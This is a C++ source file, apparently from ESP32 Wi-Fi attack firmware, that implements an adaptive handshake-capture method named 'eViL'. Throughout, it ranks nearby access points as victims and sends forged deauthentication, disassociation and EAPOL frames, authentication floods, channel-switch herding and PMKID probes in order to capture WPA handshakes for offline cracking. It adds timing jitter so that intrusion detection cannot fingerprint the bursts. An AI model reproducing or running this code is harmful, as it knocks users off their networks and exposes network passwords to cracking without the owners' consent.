// "eViL" capture method - the adaptive handshake hunter.
//
// Unlike OURS/PAN (dumb broadcast/targeted kick) or FOCUS (score + cooldown),
// eViL behaves like a living predator: it *knows* how far each target is from
// a crackable handshake (Hc22000::handshakeMask bits M1..M4), it *waits* after
// a strike so the client can re-associate and hand us M1/M2, and it *escalates*
// its effort on targets that resist while cooling down and moving away from
// ones that already yielded. The goal is maximum captured handshakes/PMKIDs
// per session, not maximum frames on the air.
//
// Behaviour summary:
//   * Complete at HS DEPTH           -> skipped, kept warm, never re-kicked.
//   * Partial progress (mask != 0)   -> top priority: strike the missing leg.
//   * PMF-capable                    -> deauth is dropped, so herd (CSA) + PMKID.
//   * No known clients               -> attract: auth-flood + PMKID probe.
//   * Client(s) known                -> per-client bidirectional strike + EAPOL.
//   * Stubborn target (no progress)  -> escalate rounds, then back off.
//
// All state lives in module-level statics so reset() wipes it cleanly between
// sessions. We never touch sniffer.cpp internals - everything comes through the
// read-only Ctx, exactly like the other methods in this folder.
#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

// ----- per-target memory ("the hunt log") --------------------------------
// eViL remembers every AP it has met: how close it is, when it was last
// kicked, how many strikes have bounced, and whether the EAPOL mask moved
// since the last strike. This is what makes it feel alive - it adapts to the
// history of each victim instead of treating every tick the same.
static const uint8_t  EVIL_SLOTS       = 16;
static const uint32_t EVIL_COOLDOWN_MS = 6000;   // default pause after a strike
static const uint32_t EVIL_FORGET_MS   = 45000;  // drop a target not seen for this long
static const uint8_t  EVIL_MAX_ROUNDS  = 6;      // escalation ceiling
static const uint8_t  EVIL_MAX_CLIENTS = 8;      // per-strike client cap (airtime budget)

struct EvilEntry {
    uint8_t  bssid[6];
    int32_t  score;        // EMA of the hunger score
    uint32_t lastKickMs;   // millis() of last strike at this AP
    uint32_t lastSeenMs;   // millis() of last time it was visible on our channel
    uint8_t  attempts;     // strikes sent at this AP (drives escalation)
    uint8_t  misses;       // consecutive strikes with no EAPOL-mask progress
    uint8_t  lastMask;     // handshake mask captured at the previous strike
    bool     used;
};
static EvilEntry s_log[EVIL_SLOTS];

// Activity counters mirror FOCUS: a cheap "is anybody talking to this AP"
// proxy, bumped on beacon ticks (legacy) or read from BeaconSlot::dataRecent
// when DATA ACT is on. Decays by halving once per second.
static const uint8_t ACT_SLOTS = 16;
static struct {
    uint8_t  bssid[6];
    uint16_t recent;
    bool     used;
} s_act[ACT_SLOTS];
static uint32_t s_lastActDecayMs = 0;

static int actSlotFor(const uint8_t* bssid) {
    for (uint8_t i = 0; i < ACT_SLOTS; i++) {
        if (s_act[i].used && memcmp(s_act[i].bssid, bssid, 6) == 0) return (int)i;
    }
    for (uint8_t i = 0; i < ACT_SLOTS; i++) {
        if (!s_act[i].used) {
            memset(&s_act[i], 0, sizeof(s_act[i]));
            memcpy(s_act[i].bssid, bssid, 6);
            return (int)i;
        }
    }
    return -1;
}

static void bumpActivity(const uint8_t* bssid) {
    int idx = actSlotFor(bssid);
    if (idx < 0) return;
    if (s_act[idx].recent < 0xFFFF) s_act[idx].recent++;
}

static void decayActivity(uint32_t now, const Ctx& ctx) {
    if (now - s_lastActDecayMs < 1000) return;
    s_lastActDecayMs = now;
    for (uint8_t i = 0; i < ACT_SLOTS; i++) {
        if (s_act[i].used) s_act[i].recent = (uint16_t)(s_act[i].recent >> 1);
    }
    if (ctx.dataAct && ctx.beacons) {
        for (uint8_t i = 0; i < ctx.beaconCount; i++) {
            if (ctx.beacons[i].dataRecent) {
                ctx.beacons[i].dataRecent = (uint16_t)(ctx.beacons[i].dataRecent >> 1);
            }
        }
    }
}

// Find (or allocate) the hunt-log entry for a BSSID. When the pool is full we
// recycle the entry we haven't seen for the longest - that's the one eViL has
// effectively given up on anyway.
static EvilEntry* entryFor(const uint8_t* bssid) {
    for (uint8_t i = 0; i < EVIL_SLOTS; i++) {
        if (s_log[i].used && memcmp(s_log[i].bssid, bssid, 6) == 0) return &s_log[i];
    }
    for (uint8_t i = 0; i < EVIL_SLOTS; i++) {
        if (!s_log[i].used) {
            memset(&s_log[i], 0, sizeof(s_log[i]));
            memcpy(s_log[i].bssid, bssid, 6);
            s_log[i].used = true;
            return &s_log[i];
        }
    }
    uint8_t worst = 0;
    uint32_t worstSeen = UINT32_MAX;
    for (uint8_t i = 0; i < EVIL_SLOTS; i++) {
        if (s_log[i].lastSeenMs < worstSeen) { worstSeen = s_log[i].lastSeenMs; worst = i; }
    }
    memset(&s_log[worst], 0, sizeof(s_log[worst]));
    memcpy(s_log[worst].bssid, bssid, 6);
    s_log[worst].used = true;
    return &s_log[worst];
}

// Forget victims we haven't met in a while, so a stale high score can never
// win a tick and the slots stay available for fresh APs.
static void expireStale(uint32_t now) {
    for (uint8_t i = 0; i < EVIL_SLOTS; i++) {
        if (s_log[i].used && (now - s_log[i].lastSeenMs) > EVIL_FORGET_MS) {
            s_log[i].used = false;
        }
    }
}

// ----- shared candidate filter -------------------------------------------
// Same skip rules every method applies: right channel, not ours, not pinned
// away, not session-skipped, strong enough.
static bool usable(const Ctx& ctx, const BeaconSlot& b) {
    if (b.channel != ctx.channel) return false;
    if (ctx.isOwnAp(b.bssid)) return false;
    if (ctx.skipPin(b.bssid)) return false;
    if (ctx.isSkipped && ctx.isSkipped(b.bssid)) return false;
    if (b.rssi < ctx.minRssi) return false;
    return true;
}

static uint8_t maskBits(uint8_t m) {
    uint8_t c = 0;
    for (uint8_t i = 0; i < 4; i++) if (m & (uint8_t)(1u << i)) c++;
    return c;
}

// ----- the hunger score ---------------------------------------------------
// eViL ranks victims by "how close am I to a crackable handshake, and how
// likely is a strike to land". Proximity + clients + activity get it started;
// the EAPOL-mask terms are what make it smart - a target that already gave us
// half the four-way is worth far more than a silent stranger.
static int32_t computeEvilScore(const BeaconSlot& b, uint8_t hsDepth, bool dataAct) {
    int32_t s = 0;

    int16_t r = b.rssi;
    if (r < -100) r = -100;
    if (r > -30)  r = -30;
    s += (int32_t)((r + 100) * 100 / 70);            // 0..100 proximity

    int32_t clientTerm = (int32_t)b.clientN * 10;
    if (clientTerm > 40) clientTerm = 40;
    s += clientTerm;
    if (b.clientN >= 4) s += 40;                     // busy AP - lots of chances

    if (dataAct) {
        uint16_t a = b.dataRecent;
        if (a > 40) a = 40;
        s += (int32_t)a;
    } else {
        int a = actSlotFor(b.bssid);
        if (a >= 0) {
            uint16_t x = s_act[a].recent;
            if (x > 40) x = 40;
            s += (int32_t)x;
        }
    }

    // Handshake progress - the heart of eViL. Every captured EAPOL bit is a
    // step closer; having exactly one leg of the M1/M2 pair already landed
    // means a single client reply completes a crackable capture.
    uint8_t mask = Hc22000::handshakeMask(b.bssid);
    s += (int32_t)maskBits(mask) * 12;
    bool m1 = (mask & 0x01) != 0, m2 = (mask & 0x02) != 0;
    if ((m1 && !m2) || (!m1 && m2)) s += 25;

    if (Hc22000::hasHandshake(b.bssid, hsDepth)) s = -1000;  // done - walk away
    if (b.pmfCapable) s -= 50;                               // deauth bounces off
    return s;
}

// ----- alive pacing -------------------------------------------------------
// How long to leave a victim alone after a strike. A target that keeps
// ignoring us gets extra room to re-associate (and we spend airtime
// elsewhere); a target that just progressed gets pressed while the handshake
// is mid-flight. This is the "waiting" that makes eViL feel alive.
static uint32_t cooldownFor(const Ctx& ctx, const EvilEntry* e) {
    uint32_t base = ctx.cooldownSec > 0 ? (uint32_t)ctx.cooldownSec * 1000u
                                        : EVIL_COOLDOWN_MS;
    if (e->misses >= 3)                         base = base * 3 / 2;
    else if (e->attempts > 0 && e->misses == 0) base = base * 2 / 3;
    if (base < 500) base = 500;
    return base;
}

// Stubborn targets get a bigger burst - anger builds with each bounced strike,
// capped so we never drown the channel.
static uint8_t roundsFor(const Ctx& ctx, const EvilEntry* e) {
    uint8_t base = ctx.kickBurst ? ctx.kickBurst : 1;
    uint8_t r = (uint8_t)(base + e->misses);
    if (r > EVIL_MAX_ROUNDS) r = EVIL_MAX_ROUNDS;
    if (r < 1) r = 1;
    return r;
}

// ----- strike / attract ---------------------------------------------------
static void strike(const Ctx& ctx, BeaconSlot& b, uint32_t now) {
    EvilEntry* e = entryFor(b.bssid);
    uint8_t maskBefore = Hc22000::handshakeMask(b.bssid);

    // Did the EAPOL mask move since our last strike? If so, this victim is
    // "breathing" (clients re-associate) - reset the miss counter and keep
    // pressing. If it stayed frozen, log a miss so the pacing escalates.
    if (e->attempts > 0) {
        if (maskBefore != e->lastMask)  e->misses = 0;
        else if (e->misses < 255)       e->misses++;
    }
    uint8_t rounds = roundsFor(ctx, e);

    if (b.clientN && ctx.bidirKick) {
        uint8_t nCli = b.clientN < EVIL_MAX_CLIENTS ? b.clientN : EVIL_MAX_CLIENTS;
        for (uint8_t c = 0; c < nCli; c++) {
            WSLBypasser::sendBidirectionalKick(b.bssid, b.clients[c],
                                               ctx.deauthReason, rounds);
            *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
            if (ctx.eapolTx) {
                WSLBypasser::sendEAPOLStart(b.bssid, b.clients[c]);
                WSLBypasser::sendEAPOLLogoff(b.bssid, b.clients[c]);
            }
            yield();
        }
    } else {
        // No clients tracked (or BIDIR off): broadcast deauth+disassoc pair.
        // JITTER MS spaces the pair so a WIDS can't fingerprint the burst;
        // otherwise the BURST pattern's own leg gap is used.
        for (uint8_t r = 0; r < rounds; r++) {
            ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
            if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
            else              delay(WSLBypasser::burstLegGapMs());
            ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
            if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
        }
        *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
    }

    if (e->attempts < 255) e->attempts++;
    e->lastMask   = maskBefore;
    e->lastKickMs = now;
    e->lastSeenMs = now;
}

// Lure stations to an AP with nobody (visibly) on it, so a handshake can even
// happen. Returns false when AUTH FLOOD is off (caller then falls back to a
// plain broadcast strike if that is allowed).
static bool attract(const Ctx& ctx, BeaconSlot& b, uint32_t now) {
    if (!ctx.authFlood) return false;
    WSLBypasser::sendAuthFlood(b.bssid, 8);
    *ctx.framesDeauth += 8;
    EvilEntry* e = entryFor(b.bssid);
    if (e->attempts < 255) e->attempts++;
    e->lastKickMs = now;
    e->lastSeenMs = now;
    return true;
}

// ----- the hunt -----------------------------------------------------------
void evil(const Ctx& ctx) {
    uint32_t now = millis();
    decayActivity(now, ctx);
    expireStale(now);

    uint8_t n = ctx.beaconCount;

    // Legacy beacon-activity bump (DATA ACT off). Mirrors FOCUS.
    if (!ctx.dataAct && ctx.beacons) {
        for (uint8_t i = 0; i < n; i++) {
            const BeaconSlot& b = ctx.beacons[i];
            if (b.channel != ctx.channel) continue;
            if (b.rssi < ctx.minRssi) continue;
            bumpActivity(b.bssid);
        }
    }

    // STEALTH pack guard: "no deauth, ever", unconditionally - even the lock
    // path below doesn't override it. CSA still runs if the pack enabled it
    // (herding is not a deauth).
    if (!ctx.bidirKick && !ctx.authFlood) {
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    if (n == 0) {
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    // ---- lock-on-BSSID: STRICT LK pins eViL to the target ---------------
    if (ctx.strictLock && ctx.lockedBssidActive && ctx.lockedBssid[0] != 0) {
        for (uint8_t i = 0; i < n; i++) {
            BeaconSlot& b = ctx.beacons[i];
            if (memcmp(b.bssid, ctx.lockedBssid, 6) != 0) continue;
            if (!usable(ctx, b)) break;
            if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) break; // done
            if (b.pmfCapable) {
                // Deauth is dropped by MFPC/MFPR - herd instead of wasting it.
                if (ctx.csaHerd) csaHerd(ctx);
                return;
            }
            if (!b.clientN) {
                if (!attract(ctx, b, now)) strike(ctx, b, now);
            } else {
                strike(ctx, b, now);
            }
            if (ctx.csaHerd) csaHerd(ctx);
            return;
        }
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    // ---- pick the hungriest, un-cooled, un-captured target --------------
    int32_t bestScore = INT32_MIN;
    int8_t  bestIdx = -1;
    for (uint8_t i = 0; i < n; i++) {
        BeaconSlot& b = ctx.beacons[i];
        if (!usable(ctx, b)) continue;
        EvilEntry* e = entryFor(b.bssid);
        e->lastSeenMs = now;
        int32_t fresh = computeEvilScore(b, ctx.hsDepth, ctx.dataAct);
        e->score = (e->score * 3 + fresh) / 4;      // EMA - calm, not jumpy

        if (e->lastKickMs != 0 && (now - e->lastKickMs) < cooldownFor(ctx, e)) continue;
        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;

        if (e->score > bestScore) { bestScore = e->score; bestIdx = (int8_t)i; }
    }

    if (bestIdx < 0 || bestScore < ctx.scoreThr) {
        // Everything is cooling down or below threshold: use the idle time to
        // attract stations somewhere, then let the CSA pack knob run.
        if (ctx.authFlood) {
            for (uint8_t i = 0; i < n; i++) {
                BeaconSlot& b = ctx.beacons[i];
                if (!usable(ctx, b)) continue;
                if (b.pmfCapable) continue;
                if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
                attract(ctx, b, now);
                break;
            }
        }
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    BeaconSlot& target = ctx.beacons[bestIdx];

    if (target.pmfCapable) {
        // Forged deauth can't reach a PMF AP: mark the visit and let the CSA
        // herd (below) push its clients off; the registered PMKID probe tries
        // the association route in parallel.
        EvilEntry* e = entryFor(target.bssid);
        e->lastKickMs = now;
        e->lastSeenMs = now;
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    if (!target.clientN) {
        // Nobody associated (that we can see): lure stations with an auth
        // flood. If AUTH FLOOD is off but BIDIR is on, still send a broadcast
        // pair so we're not idle.
        if (!attract(ctx, target, now)) strike(ctx, target, now);
    } else {
        strike(ctx, target, now);
    }

    if (ctx.csaHerd) csaHerd(ctx);
}

// ----- PMKID probe (runs in parallel when ctx.pmkidProbe) ----------------
static uint32_t s_lastProbeMs = 0;
static uint8_t  s_probeIdx = 0;

void evilProbe(const Ctx& ctx) {
    if (!ctx.pmkidProbe) return;
    uint32_t now = millis();
    if (now - s_lastProbeMs < 1200) return;
    uint8_t n = ctx.beaconCount;
    if (!n) return;

    // Rotate the scan offset for fairness, then pick the most promising
    // unpaired AP with a known SSID. PMF-capable APs get a bonus - PMKID is
    // the only likely way in when deauth is dropped.
    int8_t  best = -1;
    int32_t bestScore = INT32_MIN;
    for (uint8_t k = 0; k < n; k++) {
        s_probeIdx = (uint8_t)((s_probeIdx + 1) % n);
        const BeaconSlot& b = ctx.beacons[s_probeIdx];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        if (!b.ssid[0]) continue;
        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
        int32_t s = computeEvilScore(b, ctx.hsDepth, ctx.dataAct);
        if (b.pmfCapable) s += 60;
        if (s > bestScore) { bestScore = s; best = (int8_t)s_probeIdx; }
    }
    if (best < 0) return;

    const BeaconSlot& b = ctx.beacons[best];
    WSLBypasser::sendAuthentication(b.bssid);
    WSLBypasser::sendAssociationRequest(b.bssid, b.ssid);
    s_lastProbeMs = now;
    (*ctx.framesDeauth)++;
}

void resetEvilState() {
    memset(s_log, 0, sizeof(s_log));
    memset(s_act, 0, sizeof(s_act));
    s_lastActDecayMs = 0;
    s_lastProbeMs = 0;
    s_probeIdx = 0;
}

// RADIO→EDIT knobs this method actually reads from Ctx (0-terminated).
// 9=KICK N 10=BIDIR 11=EAPOL TX 12=PMKID 13=CSA 14=AUTH FLOOD 15=REASON
// 20=JITTER MS 21=COOLDOWN 22=SCORE THR 25=DATA ACT 26=STRICT LK 31=BURST
static const uint8_t evilKnobs[] = {9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 25, 26, 0};

CAP_METHOD_REGISTER("eViL", evil, evilProbe, resetEvilState, evilKnobs)

} // namespace Methods
} // namespace Cap

